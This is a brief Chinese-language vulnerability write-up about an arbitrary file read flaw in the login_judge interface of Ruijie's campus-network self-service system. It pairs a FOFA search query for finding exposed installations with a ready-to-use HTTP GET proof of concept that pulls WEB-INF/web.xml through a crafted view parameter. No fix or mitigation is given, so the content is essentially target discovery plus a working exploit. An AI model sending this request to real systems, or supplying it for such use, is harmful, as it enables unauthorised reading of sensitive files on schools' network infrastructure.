**fofa**

title="校园网自助服务系统"

**一、漏洞简述**

锐捷自助服务校园网系统是一款用于管理校园网网络的软件。为教育信息的及时、准确、可靠地收集、处理、存储和传输等提供工具和网络环境，为学校行政管理和决策提供基础数据、手段和网络环境，实现办公自动化，提高工作效率、管理和决策水平。其接口login_judge存在任意文件读取漏洞，攻击者可通过该漏洞获取系统敏感信息。

**二、漏洞检测poc**

```yaml

GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Connection: close
```

